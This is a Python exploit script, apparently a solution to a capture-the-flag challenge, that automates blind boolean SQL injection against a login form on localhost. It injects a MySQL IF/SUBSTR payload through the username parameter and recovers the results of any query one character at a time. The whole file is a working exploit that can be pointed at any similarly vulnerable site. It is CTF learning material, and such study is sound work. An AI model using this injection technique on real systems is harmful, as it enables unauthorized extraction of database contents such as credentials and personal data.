import requests
import re
from typing import List
from argparse import ArgumentParser

URL = "http://localhost:8080/"
SUCCESS_MSG = "Great! You logged in, " + \
              "but you&#39;ll have to dig around for the flag"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789" + \
          "ABCDEFGHIJKLMNOPQRSTUVWXYZ{}|-,:; '#+*?_/!\"§$%&/"

"""
    This script is written for the following challenge:
    https://squarectf.com/2022/goinginblind.html
    Find my writeup here:
    https://github.com/pkemkes/ctf-writeups/tree/main/squarectf2022/going-in-blind
"""


def main():
    parser = ArgumentParser()
    parser.add_argument("-q", "--query", type=str,
                        help="The query that is to be executed")
    args = parser.parse_args()
    execute_blind_query(args.query)


def execute_blind_query(query: str) -> List[str]:
    # Abort after 5 rows,
    # as there probably isn't anything interesting after this
    max_results = 5
    curr = 0
    while curr < max_results:
        result = execute_blind_query_for_row(query, curr)
        if result:
            print(result)
            curr += 1
        else:
            return
    print(f"Aborted query after {max_results} results")


def execute_blind_query_for_row(query: str, row: int) -> str:
    q = query + f" LIMIT {row},1"
    result = ""
    pos = 1
    while True:
        found = False
        for c in CHARSET:
            success = guess_char(q, pos, c)
            if success:
                result += c
                found = True
                break
        if not found:
            break
        pos += 1
    return result


def guess_char(query: str, pos: int, guess: str):
    username = "ahanlon' AND 1=" + \
              f"IF(BINARY SUBSTR(({query}), {pos}, 1) = '{guess}', 1, 2) -- "
    response = get(username, "123456")
    return was_successful(response)


def get(username: str, password: str) -> str:
    r = requests.get(URL, params={"username": username, "password": password})
    return r.text


def was_successful(text: str) -> bool:
    finds = re.findall(r'<div style="white-space:pre-wrap" >(.+)</div>', text)
    if len(finds) > 0:
        return finds[0] == SUCCESS_MSG
    return False


if __name__ == "__main__":
    main()
